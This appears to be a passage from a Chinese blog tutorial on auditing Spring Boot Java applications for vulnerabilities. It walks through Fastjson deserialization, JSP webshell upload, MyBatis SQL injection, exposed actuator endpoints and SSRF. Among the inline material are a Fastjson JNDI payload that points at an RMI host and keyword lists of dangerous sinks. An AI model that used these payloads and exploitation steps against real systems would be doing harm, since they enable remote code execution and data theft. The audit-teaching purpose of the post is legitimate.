<p>比如Fastjson的情况，如果想在 Fastjson 反序列化漏洞中利用某条特定的利用链(执行命令)，而该利用链所依赖的类和方法在pom中不存在，那么就无法成功利用该条链进行攻击，当然shiro和weblogic的反序列化也是如此</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014154327370.png" alt="image-20241014154327370"></p>
<p>可以看到是1.2.58的fastjson</p>
<p> 确认到使用的fastjson版本存在漏洞，搜索关键字<code>JSON.parse</code>和<code>JSON.parseObject</code></p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155113393.png" alt="image-20241014155113393"></p>
<p>可以看到在152行这里使用<code>JSON.parseObject()</code>方法反序列化了<code>propertyJson</code>参数</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155200173.png" alt="image-20241014155200173"></p>
<p>向上追踪<code>propertyJson</code>参数</p>
<p>发现来自于添加信息产品的产品属性<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155300117.png" alt="image-20241014155300117"></p>
<p>去功能点出利用</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155519998.png" alt="image-20241014155519998"></p>
<p>dnslog探测</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155647948.png" alt="image-20241014155647948"></p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155713362.png" alt="image-20241014155713362"></p>
<p><code>java.net.Inet4Address</code>是JDK 自带的类，因此不需要依赖额外的库或类，但也只能发送网络请求 证明此处存在fastjson反序列化漏洞。如果想要执行命令呢？直接讲利用</p>
<p>拿这个来验证<code>&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;rmi://192.168.16.126:1099/whoopsunix&quot;&#125;</code></p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014160641526.png" alt="image-20241014160641526"> 这里也给出了提示，调试过fastjson的应该也都知道，就是没有这个类</p>
<p>需要在pom中加入依赖</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014160839580.png" alt="image-20241014160839580"></p>
<p>再次验证</p>
<p>  <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014161159168.png" alt="image-20241014161159168"></p>
<p>还是不行是因为没有开启AutoType</p>
<p>初始化处加入<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014161255169.png" alt="image-20241014161255169"></p>
<p>此时就成功了</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014161329200.png" alt="image-20241014161329200"></p>
<p>上面这个项目中，笔者只是举例来证明第二点，通过手动修改代码来 RCE肯定是不行的。在一些SRC、众测或者甲方的项目中，通过网络请求验证存在Fastjson反序列化漏洞，评分是很低的，往往还需要提供完整的利用链做到RCE才能算有效高危</p>
<p> 到了这里，大家应该也都明白了，pom中关注依赖不仅是为了利用依赖的漏洞，对我们利用反序列化相关类也是很重要的</p>
<h5 id="正向审计"><a href="#正向审计" class="headerlink" title="正向审计"></a>正向审计</h5><p>​	一、从一个功能点开始测试，就是我们平常渗透，外加代码层分析，最终来确认这个有没有漏洞，怎么去利用</p>
<p>​	二、从Controller层的映射路径开始，一直追踪，代码到底做了什么，是否存在漏洞</p>
<p>​	在这里，我发现了可以利用文件上传漏洞的功能点</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014163531369.png" alt="image-20241014163531369"></p>
<p>​	映射路径定位到代码块</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014163628444.png" alt="image-20241014163628444"></p>
<p>​	定位到映射路径</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014163800065.png" alt="image-20241014163800065"></p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014164011585.png" alt="image-20241014164011585"></p>
<p>​	这里可以看到，对文件的处理只是获取到后缀，然后随机名+后缀，存储到了<code>res/images/item/adminProfilePicture/</code>这个目录中，</p>
<p>​	发现在pom中存在jsp解析的依赖</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014164355171.png" alt="image-20241014164355171"></p>
<p>​	这样就可以上传jsp马来getshell</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014164906606.png" alt="image-20241014164906606"></p>
<p>​	成功</p>
<p>​	遗憾的是，这种Springboot支持解析jsp的项目出现概率极低。Springboot先进的技术让前端几乎都是依靠模板渲染，或者前后端分离模式部署</p>
<p>​	推荐大家去看我的这两篇文章，有一些比较详细的描写</p>
<p><a href="https://seven1an.github.io/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/">	SpringBoot场景下不出网-内存中的正向代理 | Seven1an’s blog</a></p>
<p><a href="https://seven1an.github.io/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/">	文件覆盖漏洞-crontab反弹shell细节问题 | Seven1an’s blog</a></p>
<p>​	 继续正向审计，大部分SpringBoot项目Dao层几乎都是Myabtis，下面这个项目也是</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014180952094.png" alt="image-20241014180952094"></p>
<p>​	映入眼帘是搜索框</p>
<p>​	搜索，抓包</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014181024437.png" alt="image-20241014181024437"></p>
<p>​	映射路径定位到代码块<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014181253700.png" alt="image-20241014181253700"></p>
<p>​	大概分析一下，</p>
<p>​	控制器方法 <code>searchPage</code> 处理了 “&#x2F;search” 和 “&#x2F;search.html” 路径的 GET 请求，将请求的参数都封装到类型为Map的params的对象中，并且对指定的几个关键字做了单独处理</p>
<p>​	检查 <code>params</code> 中是否有 <code>page</code> 参数。如果没有，默认设为 1</p>
<p>​	给<code>limit</code>设置为了10</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014182034422.png" alt="image-20241014182034422"></p>
<p>​	下面的if进行了一个分类筛选</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014182215607.png" alt="image-20241014182215607"></p>
<p>​	如果存在并且非空，将其转换为 <code>Long</code> 类型的 <code>categoryId</code>。</p>
<p>​	通过 <code>newBeeMallCategoryService.getCategoriesForSearch(categoryId)</code> 来获取该分类搜索信息，并保存到 <code>searchPageCategoryVO</code>。</p>
<p>​	如果有数据，使用 <code>request.setAttribute()</code> 将分类数据添加到请求对象中</p>
<p>​	接下来处理<code>orderBy</code>和<code>key</code></p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014182610152.png" alt="image-20241014182610152"></p>
<p>​	检查<code>params</code> 中有无<code>orderBy</code>这个参数，验证非空后设置为请求属性</p>
<p>​	检查<code>params</code> 中有无<code>keyword</code>这个参数，验证非空之后去掉空格，把参数中<code>keyword</code>的值传递给<code>keyword</code>，同时也将其作为请求属性和 <code>params</code> 中的值存储</p>
<p>​	然后就是封装，调用service层的<code>newBeeMallGoodsService.searchNewBeeMallGoods</code>方法查询封装的对象，返回查询结果</p>
<p>​	在这之间没有发现任何防护</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015143110444.png" alt="image-20241015143110444"></p>
<p>​	没有过滤器实现，拦截器中也没有发现相关防护代码</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014185411742.png" alt="image-20241014185411742"></p>
<p>​	看一下<code>newBeeMallGoodsService.searchNewBeeMallGoods</code>做了什么，可以看到方法中又调用了Dao层的<code>goodsMapper.findNewBeeMallGoodsListBySearch</code>来操作封装对象</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014185602363.png" alt="image-20241014185602363"></p>
<p>​	定位到Dao层</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015142306401.png" alt="image-20241015142306401"></p>
<p>​	继续跟进到 MyBatis 的 SQL 映射文件，查看对应的SQL语句发现进行了一个查询和排列的操作</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014185653768.png" alt="image-20241014185653768"></p>
<p>​	到了这里，就不言而喻了</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015143417580.png" alt="image-20241015143417580"></p>
<p>​	${}拼接参数	</p>
<p>​	众所周知，<strong>动态拼接是核心是sql注入核心</strong>，也就是<code>keyword</code>参数存在注入</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015144553817.png" alt="image-20241015144553817"></p>
<p>​	成功</p>
<p>​	再来看这里</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015145853697.png" alt="image-20241015145853697"></p>
<p>​	订单号这一串是否存在注入？</p>
<p>​	映射路径定位到代码块</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015150037208.png" alt="image-20241015150037208"></p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015150102666.png" alt="image-20241015150102666"></p>
<p>​	一直追踪到MyBatis 的 SQL 映射文件</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015150224555.png" alt="image-20241015150224555"></p>
<p>​	 这里使用了<code>#&#123;&#125;</code> 作为参数的占位符，也就是预编译机制，所以不存在SQL注入</p>
<p>篇幅原因三个简单的例子，希望各位可以理解正向审计的流程，从功能点入手再结合代码分析。这种方法对漏洞的发现效率是非常低的，对我来说往往是功能点太多了耗时耗力，有的忙活调试大半天发现无法利用！这样的话我们就需要逆向追踪这种挖掘路线</p>
<h5 id="逆向追踪"><a href="#逆向追踪" class="headerlink" title="逆向追踪"></a>逆向追踪</h5><p>​	大家可以<strong>回顾到本文的POM目录</strong>，我举例说了log4j2和fastjson两种漏洞的利用，从漏洞点开始，特定的方法、关键字的发现，追踪到Controller层，看看是不是用户输入的(参数可控)。为什么不用正则？因为这在文章后期的工具中有更好的实现！就不要手工来折磨自己了</p>
<p>​	第一个例子：</p>
<p>​	因为是Mybatis项目，所以全局搜索xml文件中的$ 来挖一个SQL注入，需要从Dao层追踪到Controller层</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015191437614.png" alt="image-20241015191437614"></p>
<p>​	跟进<code>$&#123;goodsName&#125;</code></p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015191624570.png" alt="image-20241015191624570"></p>
<p>​	确认这个参数是从哪里过来的，它的值能不能在功能点处控制</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015191807543.png" alt="image-20241015191807543"></p>
<p>​	进入Service层的实现类<code>NewBeeMallGoodsServiceImpl.java</code>，发现被<code>getNewBeeMallGoodsPage</code>方法调用</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015192118844.png" alt="image-20241015192118844"></p>
<p>​	跟进查看谁调用了<code>getNewBeeMallGoodsPage</code>方法</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015192244028.png" alt="image-20241015192244028"></p>
<p>​	并没有发现拦截过滤的防护代码，此时只需要找到前端触发映射的功能点，传递名为<code>goodsName</code>的参数附带SQL语句即可</p>
<p>​	这里会出现一个问题，如何去找到功能点呢？</p>
<p>​	我的思路：</p>
<ol>
<li><p>阅读注和释开发文档</p>
</li>
<li><p>拼接触发url，返回结果推断</p>
</li>
<li><p>触发的变量，抓包搜索</p>
</li>
<li><p>分析代码，直接构造请求</p>
</li>
<li><p>前端使劲找</p>
<p>这里使用第4种，考虑到路径前缀的情况，先从Endpoints看下完整映射路径</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015194434219.png" alt="image-20241015194434219"></p>
<p>加入cookie后构造payload</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015194757541.png" alt="image-20241015194757541"></p>
</li>
</ol>
<p>​		根据代码处可以得知<code>page</code>和<code>limit</code>是必不可少的，再加上<code>goodName</code>参数即可</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015195105532.png" alt="image-20241015195105532"></p>
<p>​		到这里就证明<code>goodsName</code>存在SQL注入漏洞</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015200003930.png" alt="image-20241015200003930"></p>
<p>​	第二个例子：</p>
<p>​	 pom中发现引用了Spring Security依赖</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016135531241.png" alt="image-20241016135531241"></p>
<p>​	很多SpringBoot都会引入Spring Security来做安全访问管理，在Spring Security中，我们可以通过如下几个关键字方法来定位代码，帮助挖掘<strong>未授权访问漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">authorizeRequests()</span><br><span class="line"></span><br><span class="line">formLogin()</span><br><span class="line"></span><br><span class="line">userDetailsService()</span><br><span class="line"></span><br><span class="line">ignoring()</span><br><span class="line"></span><br><span class="line">HttpSecurity</span><br><span class="line"></span><br><span class="line">permitAll()</span><br></pre></td></tr></table></figure>

<p>​	通过搜索<code>ignoring</code>发现了无需验证就可以访问的地方</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016144813315.png" alt="image-20241016144813315"></p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016144827832.png" alt="image-20241016144827832"></p>
<p>​	这不就有了几个无需登录鉴权就可以访问的地方吗，还是非常多的，直接访问危害最大的<code>/actuator/</code>看下</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016145023661.png" alt="image-20241016145023661"></p>
<p>​	这里可以利用的点就非常多了：env星号解密、env加refresh进行getshell、heapdump分析获取敏感信息</p>
<p>​	在application.yml中，可以看到也是开启了heapdump，这个默认是关闭的</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016145726644.png" alt="image-20241016145726644"></p>
<p>​	那么就可以利用这个漏洞，危害是巨大的</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016145837023.png" alt="image-20241016145837023"></p>
<p>​	最后一个案例：</p>
<p>​	这次挖一下有没有SSRF漏洞，SSRF出现在网络请求的地方，如下是一些网络请求实现的关键字，通过关键字快速定位是否使用了该依赖以及相关HTTP请求方法，具体逻辑还需根据实际代码分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">HttpRequest.get</span><br><span class="line">HttpRequest.post</span><br><span class="line">Jsoup.connect</span><br><span class="line">getForObject</span><br><span class="line">RestTemplate</span><br><span class="line">postForObject</span><br><span class="line">httpclient</span><br><span class="line">execute</span><br><span class="line">HttpClients.createDefault</span><br><span class="line">httpasyncclient</span><br><span class="line">HttpAsyncClients.createDefault</span><br><span class="line">java.net.URLConnection</span><br><span class="line">openConnection</span><br><span class="line">java.net.HttpURLConnection</span><br><span class="line">openStream</span><br><span class="line">Socket</span><br><span class="line">java.net.Socket</span><br><span class="line">okhttp</span><br><span class="line">OkHttpClient</span><br><span class="line">newCall</span><br><span class="line">ImageIO.read</span><br><span class="line">javax.imageio.ImageIO</span><br><span class="line">HttpRequest.get</span><br><span class="line">jsoup</span><br><span class="line">Jsoup.connect</span><br><span class="line">RestTemplate</span><br><span class="line">org.springframework.web.client.RestTemplate</span><br></pre></td></tr></table></figure>

<p>​	全局搜索一些，主要还是结合依赖和目录文件看作者的开发习惯命名，但命名几乎都差不多少</p>
<p>​	搜索<code>newCall</code>，看到有<code>newCall(request).execute()</code>，它是 OkHttp 库中的方法调用，用于发起一个 HTTP 请求并同步地获取响应</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016180729443.png" alt="image-20241016180729443"></p>
<p>​	进入到<code>SysbaseSupport.java</code>中分析，发现这是一个名为<code>upload</code>的方法</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016181143276.png" alt="image-20241016181143276"></p>
<p>​	在这个方法中，接收了两个参数，接收一个 File对象和一个上传的 URL，着重观察uploadUrl，很多情况下url都是我们可控的，可以发现它被添加到了请求中，然后通过<code>OkHttpUtils.useHeaders</code>构建为了最终请求，并且通过<code>newCall</code>发送了出去，这里可以肯定是，如果可以控制uploadUrl这个参数的值，那么就存在SSRF漏洞，在这其中也没有发现过滤的相关防护代码</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016183050389.png" alt="image-20241016183050389"></p>
<p>​	现在去查看哪里调用过upload，怎么去传递uploadUrl参数</p>
<p>​	查找之后发现一处调用</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016183313220.png" alt="image-20241016183313220"></p>
<p>​	这仅有的一处结果把uploadUrl硬编码写好了，这我们就无法从前端控制，故不存在漏洞</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016183440066.png" alt="image-20241016183440066"></p>
<p>​	此处不存在，我们换下一个，来到get方法</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016183650025.png" alt="image-20241016183650025"></p>
<p>​	这里还是一样的套路，再去找哪些地方调用了get方法</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016184007338.png" alt="image-20241016184007338"></p>
<p>​	一共有四处调用，前两处是方法重载调用的不关注，我们来到第二处的第一个<code>FileDownloader.java</code>的<code>readRawText</code>方法，这里可以看到，GET请求<code>read-raw</code>这个映射路径进行调用，从请求中获取到<code>url</code>赋值给filePath，获取请求中的 <code>charset</code> ，如果请求中没有此参数，则使用默认字符集 <code>AppUtils.UTF8</code>赋值给charset，以及<code>cut</code>参数的获取与赋值</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016184927796.png" alt="image-20241017132505631"></p>
<p>​	接着进入了一个if判断，跟进<code>isExternalUrl</code>方法得知做了url格式验证，可以看到如果filePath也就是传过来的url，既不是字符串也不是以<code>http://</code>或<code>https://</code>开头就返回false</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016185110655.png" alt="image-20241016185110655"></p>
<p>​	然后接着调用get方法，到了get里面也就执行了请求</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016185634456.png" alt="image-20241016185812783"></p>
<p>​	验证</p>
<p>​	 <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016190009285.jpeg" alt="img"></p>
<p>​	也是成功了</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016190453535.png" alt="image-20241016190453535"></p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016190509050.png" alt="image-20241016190509050"></p>
<p>​	看到这里，有些师傅其实发现了，这不就是CVE-2024-1021吗？没错，笔者确实没有花费时间再去找案例写博客，验证思路效果即可，无非是复现漏洞反推嘛</p>
<p>​	这里演示了SQL注入，SpringBoot未授权访问，SSRF的漏洞挖掘，其他漏洞也都是换汤不换药，不同的漏洞肯定是不同代码写的，那无非就寻找不同的关键字确认功能点与可控参数</p>
<p>中期暂时就这些，后面的话我准备把各类漏洞的逆向追踪挖掘再丰富一下</p>
<p>人工耗时耗力，为了保证产出可以更高效，我们需要使用工具辅助挖掘，进入第三个阶段</p>
<h4 id="后期-工具辅助"><a href="#后期-工具辅助" class="headerlink" title="后期(工具辅助)"></a>后期(工具辅助)</h4><p>​	在这个阶段，我们对一个项目经过了环境搭建、手工审计的流程之后，肯定是相当熟悉了，相信也会有一些产出成果</p>
<p>​	现阶段的许多代码审计工具，特别是静态分析工具，主要依赖于<strong>关键字匹配、正则表达式和规则集</strong>来发现代码中的潜在漏洞，或许很近的未来会有AI的加入，到那时工具就不会那么死板了， AI 的加入将彻底改变代码审计的方式，我是非常期待的</p>
<p>​	可能会有没有怎么接触代码审计的师傅疑问，”为什么不能直接工具一把梭?”，首先，我提倡的是手工审计+工具辅助，是辅助！而且静态分析工具虽然强大，但它们主要依赖于关键字匹配、正则表达式和预定义的规则集。比如出现复杂的逻辑漏洞和复杂的业务，以及某些仅在特定环境下的漏洞它又怎么能发现的了，这些影响不亚于RCE类高危漏洞。其次，大量的误报也会增加工作量，手工审计也是熟悉项目的一个过程，熟悉了之后对复现也有帮助</p>
<p>​	最后，我们通过利用<strong>工具审计+手工审计</strong>共同再做一个收尾工作，试着发现遗漏的点</p>
<h5 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h5><p>​	Link:<code>https://github.com/chaitin/xray</code></p>
<p>​	<strong>具体使用大家可以去看下我2021年发在freebuf的文章 Link:</strong><code>https://www.freebuf.com/articles/web/277286.html</code></p>
<p>​	<strong>本文到这里已经接近八千字了，笔者尽量不在阐述已经讲过的东西了</strong></p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241017144826870.png" alt="image-20241017144826870"></p>
<p>​	在代码审计这块大同小异，也是利用Xray的被动扫描，本地搭建的环境没有WAF可以尽情扫，我使用的两种形式</p>
<p>​		<strong>解放双手版：搭配Rad爬虫实现自动化扫描进行</strong></p>
<p>​		<strong>高效出成果版：手工审计的同时开启Xray做后台扫描</strong></p>
<p>​	各有各的好处，如果大家也有什么利用思路，恳求传授</p>
